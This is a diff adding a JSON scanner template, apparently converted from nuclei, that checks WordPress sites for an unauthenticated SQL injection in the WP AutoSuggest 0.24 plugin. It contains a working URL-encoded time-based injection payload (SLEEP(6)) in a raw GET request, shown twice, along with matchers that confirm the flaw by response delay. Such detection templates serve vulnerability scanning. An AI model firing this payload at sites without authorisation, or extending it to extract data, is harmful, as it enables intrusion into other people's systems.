@@ -1,0 +1,125 @@
+{
+  "id": "wp-autosuggest-sql-injection",
+  "name": "WP AutoSuggest 0.24 - SQL Injection",
+  "author": "theamanrawat",
+  "severity": "CRITICAL",
+  "description": "The wp-autosuggest WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.\n",
+  "references": [
+    "https://wpscan.com/vulnerability/9188",
+    "https://wordpress.org/plugins/wp-autosuggest/"
+  ],
+  "tags": [
+    "time-based-sqli",
+    "wp-plugin",
+    "wp",
+    "wp-autosuggest",
+    "wpscan",
+    "sqli",
+    "wordpress"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "@timeout: 20s\nGET /wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action\u003dquery\u0026wpas_keys\u003d1%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5202%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%286%29%29%29yRVR%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27dwQZ%27%2F%2A%2A%2FLIKE%2F%2A%2A%2F%27dwQZ HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "duration\u003e\u003d6",
+            "status_code \u003d\u003d 200",
+            "contains(content_type, \"text/xml\")",
+            "contains(body, \"\u003cresults\u003e\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "wp-autosuggest-sql-injection",
+    "info": {
+      "name": "WP AutoSuggest 0.24 - SQL Injection",
+      "author": "theamanrawat",
+      "severity": "critical",
+      "description": "The wp-autosuggest WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.\n",
+      "reference": [
+        "https://wpscan.com/vulnerability/9188",
+        "https://wordpress.org/plugins/wp-autosuggest/"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "time-based-sqli,wp-plugin,wp,wp-autosuggest,wpscan,sqli,wordpress"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "@timeout: 20s\nGET /wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action\u003dquery\u0026wpas_keys\u003d1%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5202%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%286%29%29%29yRVR%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27dwQZ%27%2F%2A%2A%2FLIKE%2F%2A%2A%2F%27dwQZ HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "duration\u003e\u003d6",
+              "status_code \u003d\u003d 200",
+              "contains(content_type, \"text/xml\")",
+              "contains(body, \"\u003cresults\u003e\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
